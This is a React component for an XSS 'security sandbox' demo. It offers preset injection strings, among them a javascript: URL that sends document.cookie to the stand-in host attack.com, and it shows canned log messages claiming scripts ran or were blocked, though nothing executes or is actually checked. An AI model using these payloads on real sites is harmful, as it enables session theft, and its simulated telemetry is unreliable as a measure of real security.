"use client";

import React, { useState } from "react";
import { ShieldCheck, ShieldAlert, Play, RefreshCcw } from "lucide-react";

interface LogEntry {
  timestamp: string;
  type: "info" | "neutralized" | "executed" | "warning";
  message: string;
}

export default function SecuritySandbox() {
  const [payload, setPayload] = useState("<script>alert('hacked')</script>");
  const [securityOn, setSecurityOn] = useState(true);
  const [logs, setLogs] = useState<LogEntry[]>([
    {
      timestamp: "11:40:01",
      type: "info",
      message: "Content Security Policy initialized: script-src 'self'",
    },
    {
      timestamp: "11:40:02",
      type: "info",
      message: "Client-server API handshake payload signature verified.",
    },
  ]);
  const [attackFired, setAttackFired] = useState(false);
  const [sanitizedResult, setSanitizedResult] = useState("");

  const runSecurityCheck = () => {
    setAttackFired(true);
    const timeStr = new Date().toLocaleTimeString([], {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
    });

    const newLogs: LogEntry[] = [
      { timestamp: timeStr, type: "info", message: `Analyzing incoming string payload` },
    ];

    if (securityOn) {
      const sanitized = payload
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");

      newLogs.push({
        timestamp: timeStr,
        type: "warning",
        message: "Script characters detected in input. Execution blocked.",
      });
      newLogs.push({
        timestamp: timeStr,
        type: "neutralized",
        message: "Neutralized XSS payload successfully.",
      });

      setSanitizedResult(sanitized);
    } else {
      newLogs.push({
        timestamp: timeStr,
        type: "warning",
        message: "Warning: Input validation filters inactive!",
      });
      newLogs.push({
        timestamp: timeStr,
        type: "executed",
        message: "Injected script parsed and executed.",
      });
      newLogs.push({
        timestamp: timeStr,
        type: "executed",
        message: "Simulation Alert: Session cookie payload intercepted.",
      });

      setSanitizedResult(payload);
    }

    setLogs((prev) => [...prev, ...newLogs]);
  };

  const handlePayloadChoice = (chosen: string) => {
    setPayload(chosen);
    setAttackFired(false);
    setSanitizedResult("");
  };

  const getLogBadgeStyle = (type: string) => {
    switch (type) {
      case "neutralized":
        return "text-indigo-700 bg-indigo-50 border-indigo-100";
      case "executed":
        return "text-rose-700 bg-rose-50 border-rose-100 font-bold";
      case "warning":
        return "text-amber-700 bg-amber-50 border-amber-100";
      default:
        return "text-zinc-500 bg-zinc-50 border-zinc-100";
    }
  };

  return (
    <div
      className={`premium-card rounded-2xl overflow-hidden bg-white border transition-all duration-300 flex flex-col h-[520px] ${
        attackFired && !securityOn ? "border-rose-450/60 shadow-sm" : "border-zinc-200"
      }`}
    >
      {/* Header */}
      <div className="px-5 py-4 border-b border-zinc-100 flex items-center justify-between">
        <div>
          <h3 className="text-xs font-mono uppercase text-zinc-400 tracking-wider">
            Web Security Operations
          </h3>
          <p className="text-sm font-semibold text-zinc-900 mt-0.5">
            Content Security Policy Inspector
          </p>
        </div>
        <div className="flex items-center space-x-3">
          <span className="text-[10px] font-mono text-zinc-400">Policy Filter:</span>
          <button
            onClick={() => {
              setSecurityOn(!securityOn);
              setAttackFired(false);
              setSanitizedResult("");
            }}
            className={`px-3 py-1 rounded-lg text-[10px] font-mono font-bold border transition-colors ${
              securityOn
                ? "bg-indigo-50 text-indigo-600 border-indigo-200"
                : "bg-rose-50 text-rose-600 border-rose-200 animate-pulse"
            }`}
          >
            {securityOn ? "ACTIVE" : "INACTIVE"}
          </button>
        </div>
      </div>

      <div className="flex-1 grid grid-cols-1 lg:grid-cols-5 divide-y lg:divide-y-0 lg:divide-x divide-zinc-100 overflow-hidden">
        {/* Left Panel: Inputs and Quick Payloads */}
        <div className="lg:col-span-2 p-5 flex flex-col justify-between space-y-4 overflow-y-auto">
          <div className="space-y-4">
            <div>
              <label className="text-[10px] font-mono text-zinc-450 uppercase block mb-1.5">
                Standard Injection Vectors
              </label>
              <div className="grid grid-cols-1 gap-1">
                <button
                  onClick={() => handlePayloadChoice("<script>alert('xss')</script>")}
                  className="px-3 py-2 text-left bg-zinc-50 border border-zinc-200/60 hover:border-zinc-350/50 rounded-xl text-[10px] font-mono text-zinc-600 truncate transition-colors"
                >
                  &lt;script&gt; Tag Payload
                </button>
                <button
                  onClick={() => handlePayloadChoice("<img src=x onerror=alert('compromise')>")}
                  className="px-3 py-2 text-left bg-zinc-50 border border-zinc-200/60 hover:border-zinc-350/50 rounded-xl text-[10px] font-mono text-zinc-600 truncate transition-colors"
                >
                  &lt;img&gt; Event Payload
                </button>
                <button
                  onClick={() =>
                    handlePayloadChoice("javascript:fetch('http://attack.com?c='+document.cookie)")
                  }
                  className="px-3 py-2 text-left bg-zinc-50 border border-zinc-200/60 hover:border-zinc-350/50 rounded-xl text-[10px] font-mono text-zinc-600 truncate transition-colors"
                >
                  document.cookie fetch Payload
                </button>
              </div>
            </div>

            <div className="space-y-1.5">
              <label className="text-[10px] font-mono text-zinc-455 uppercase block">
                Source Code Payload
              </label>
              <textarea
                value={payload}
                onChange={(e) => {
                  setPayload(e.target.value);
                  setAttackFired(false);
                }}
                rows={3}
                className="w-full bg-zinc-50 border border-zinc-200 rounded-xl p-2.5 text-xs font-mono text-zinc-800 placeholder-zinc-400 focus:outline-none focus:border-zinc-300 resize-none"
              />
            </div>

            <button
              onClick={runSecurityCheck}
              className={`w-full py-2.5 px-4 rounded-xl font-bold text-xs flex items-center justify-center space-x-2 transition-colors ${
                securityOn
                  ? "bg-indigo-600 hover:bg-indigo-700 text-white"
                  : "bg-rose-650/80 hover:bg-rose-700 text-white animate-pulse"
              }`}
            >
              <Play size={12} fill="currentColor" />
              <span>Verify Security Response</span>
            </button>
          </div>

          <div className="bg-zinc-50 border border-zinc-100 p-3 rounded-xl text-[9px] font-mono space-y-1 text-zinc-500">
            <p className="text-zinc-800 font-bold uppercase text-[9px] mb-1">CSP Headers Active</p>
            <p>script-src &apos;self&apos;;</p>
            <p>object-src &apos;none&apos;;</p>
          </div>
        </div>

        {/* Right Panel: Operations Console Logs */}
        <div className="lg:col-span-3 p-5 flex flex-col overflow-hidden h-full bg-zinc-50/30">
          <div className="text-[10px] font-mono uppercase text-zinc-400 border-b border-zinc-100 pb-2 mb-2 flex justify-between items-center">
            <span>Inspector Telemetry</span>
            <RefreshCcw size={10} className="text-zinc-400" />
          </div>

          <div className="flex-1 overflow-y-auto space-y-2 font-mono text-[10px] bg-white p-3 rounded-xl border border-zinc-200 pr-1">
            {logs.map((log, idx) => (
              <div
                key={idx}
                className="flex space-x-2 items-start leading-tight py-0.5 border-b border-zinc-50/50"
              >
                <span className="text-zinc-400 shrink-0">[{log.timestamp}]</span>
                <span
                  className={`text-[8px] font-semibold shrink-0 uppercase px-1.5 py-0.5 rounded border ${getLogBadgeStyle(log.type)}`}
                >
                  {log.type}
                </span>
                <span className="flex-1 text-zinc-600 text-[9.5px]">{log.message}</span>
              </div>
            ))}

            {attackFired && (
              <div className="mt-4 pt-3.5 border-t border-zinc-100 space-y-2">
                <span className="text-[10px] uppercase font-bold text-zinc-800 block">
                  Interpreter Output
                </span>

                {securityOn ? (
                  <div className="bg-emerald-50 border border-emerald-100 p-3 rounded-xl text-emerald-800 flex items-start space-x-2">
                    <ShieldCheck size={14} className="shrink-0 mt-0.5 text-emerald-600" />
                    <div className="space-y-1 text-xs">
                      <p className="font-bold text-[10px] text-emerald-900">Payload Sanitized:</p>
                      <code className="text-zinc-800 text-[9px] bg-white border border-zinc-200 px-1.5 py-0.5 rounded break-all block mt-1">
                        {sanitizedResult}
                      </code>
                    </div>
                  </div>
                ) : (
                  <div className="bg-rose-50 border border-rose-100 p-3 rounded-xl text-rose-800 flex items-start space-x-2">
                    <ShieldAlert size={14} className="shrink-0 mt-0.5 text-rose-650" />
                    <div className="space-y-1 text-xs">
                      <p className="font-bold text-[10px] text-rose-900">
                        Sandbox Alert (Vulnerability Allowed):
                      </p>
                      <p className="text-[9.5px] text-rose-700 mt-1">
                        JavaScript string executed directly in sandbox. Cookie parameters
                        transmitted.
                      </p>
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
